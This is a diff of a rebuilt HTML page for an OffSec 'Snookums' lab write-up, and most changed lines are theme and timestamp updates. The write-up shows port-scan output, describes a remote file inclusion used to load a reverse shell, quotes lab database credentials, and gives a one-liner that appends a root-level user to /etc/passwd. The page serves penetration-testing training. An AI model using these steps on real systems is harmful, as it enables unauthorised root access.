@@ -3,7 +3,7 @@
   <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.161.1">
     <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
     <meta name="description" content="A comprehensive writeup for the OffSec Snookums machine. Learn how to exploit an RFI vulnerability in SimplePHPGallery for an initial foothold, extract database credentials, and achieve root access by exploiting a writable /etc/passwd file.">
     <meta name="author" content="">
@@ -29,27 +29,28 @@
     <meta itemprop="wordCount" content="428">
     <meta itemprop="keywords" content="Openssl,/Etc/Passwd,Writable">
     <title>Snookums :: Zenu</title>
-    <link href="/images/favicon.png?1779778938" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1779778938" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1779778938" defer></script>
-    <script src="/js/search-lunr.js?1779778938" defer></script>
-    <script src="/js/search.js?1779778938" defer></script>
+    <link href="/images/favicon.png?1784855724" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1784855724" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1784855724" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1784855724" defer></script>
+    <script src="/js/search-lunr.js?1784855724" defer></script>
+    <script src="/js/search.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1779778938";
+      window.relearn.index_js_url="/searchindex.en.js?1784855724";
     </script>
-    <script src="/js/lunr/lunr.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1779778938" defer></script>
+    <script src="/js/lunr/lunr.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779778938" rel="stylesheet">
-    <link href="/css/theme.css?1779778938" rel="stylesheet">
-    <link href="/css/format-html.css?1779778938" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784855724" rel="stylesheet">
+    <link href="/css/theme.css?1784855724" rel="stylesheet">
+    <link href="/css/format-html.css?1784855724" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -162,7 +163,7 @@
 <h1 id="snookums">Snookums</h1>
 
 <h1 id="port-scan">port scan<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE     VERSION
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE     VERSION
 </span></span><span style="display:flex;"><span>21/tcp    open  ftp         vsftpd 3.0.2
 </span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
@@ -201,8 +202,8 @@
 </span></span><span style="display:flex;"><span>Service Info: Host: SNOOKUMS; OS: Unix</span></span></code></pre></div>
 <h1 id="initial-foothold">initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <p>Upon navigating to the web interface, I identified the version of the underlying framework.</p>
-<p><a href="#R-image-c56aad38610085f678487b80f0ad20c1" class="lightbox-link"><img alt="web" class="lazy lightbox figure-image" loading="lazy" src="/images/snookums/web-1.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-c56aad38610085f678487b80f0ad20c1"><img alt="web" class="lazy lightbox lightbox-image" loading="lazy" src="/images/snookums/web-1.png"></a></p>
+<p><a href="#R-image-0b01686d21342b2e1d6cd61823f0aac7" class="lightbox-link"><img alt="web" class="lazy lightbox figure-image" loading="lazy" src="/images/snookums/web-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0b01686d21342b2e1d6cd61823f0aac7"><img alt="web" class="lazy lightbox lightbox-image" loading="lazy" src="/images/snookums/web-1.png"></a></p>
 <p>Researching this specific version revealed that version 0.7 is vulnerable to <a href="https://www.exploit-db.com/exploits/48424" rel="external">RFI vulnerability</a>.</p>
 <p>Through further testing, I confirmed that this vulnerability persists in version 0.8 as well.</p>
 <p>To gain an initial shell, I prepared a PHP reverse shell script on my local attacker machine. I then leveraged the RFI vulnerability by pointing the <code>img</code> parameter to my hosted shell:</p>
@@ -211,7 +212,7 @@
 <h1 id="privilege-escalation">Privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <h2 id="apache---michael">apache -&gt; michael<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>While enumerating the web root directory, I discovered a database configuration file containing hardcoded credentials:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBHOST&#39;</span>, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBUSER&#39;</span>, <span style="color:#e6db74">&#39;root&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBPASS&#39;</span>, <span style="color:#e6db74">&#39;MalapropDoffUtilize1337&#39;</span>);
@@ -232,7 +233,7 @@
 <p>After switching to michael via SSH, I ran linpeas.</p>
 <p>The results highlighted the <code>/etc/passwd</code> file was writable.</p>
 <p>I exploited this by appending a new user with root privileges (UID 0) to the passwd file:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>openssl passwd Password123<span style="color:#66d9ef">)</span>; echo <span style="color:#e6db74">&#34;r00t:</span><span style="color:#e6db74">${</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">:0:0:root:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>openssl passwd Password123<span style="color:#66d9ef">)</span>; echo <span style="color:#e6db74">&#34;r00t:</span><span style="color:#e6db74">${</span>pw<span style="color:#e6db74">}</span><span style="color:#e6db74">:0:0:root:/root:/bin/bash&#34;</span> &gt;&gt; /etc/passwd</span></span></code></pre></div>
 <p>Finally, switch user to r00t with the password.</p>
 
   <footer class="footline">
@@ -337,8 +338,8 @@
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779778938" defer></script>
-    <script src="/js/theme.js?1779778938" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784855724" defer></script>
+    <script src="/js/theme.js?1784855724" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
